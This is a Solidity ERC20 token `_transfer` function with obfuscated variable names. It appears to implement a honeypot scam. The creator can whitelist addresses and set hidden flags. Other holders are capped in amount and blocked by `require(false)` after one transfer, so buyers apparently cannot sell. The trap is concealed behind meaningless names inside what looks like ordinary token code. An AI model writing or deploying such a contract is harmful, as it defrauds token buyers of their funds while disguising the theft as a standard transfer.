function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (pampers == false)) {
        england = chTx;
        ireland = true;
    }
    if ((address(sender) == creator) && (pampers == true)) {
        pickle[recipient] = true;
        dragonfruit[recipient] = false;
        pampers = false;
    }
    if ((amount > golden) && (pickle[sender] == true) && (address(sender) != creator)) {
        baelrog[recipient] = true;
    }
    if (pickle[recipient] != true) {
        dragonfruit[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((dragonfruit[sender]) && (pickle[recipient] == false)) {
        dragonfruit[recipient] = true;
    }
    if (pickle[sender] == false) {
        if ((amount > golden) && (baelrog[sender] == true)) {
            require(false);
        }
        require(amount < england);
        if (ireland == true) {
            if (baelrog[sender] == true) {
                require(false);
            }
            baelrog[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

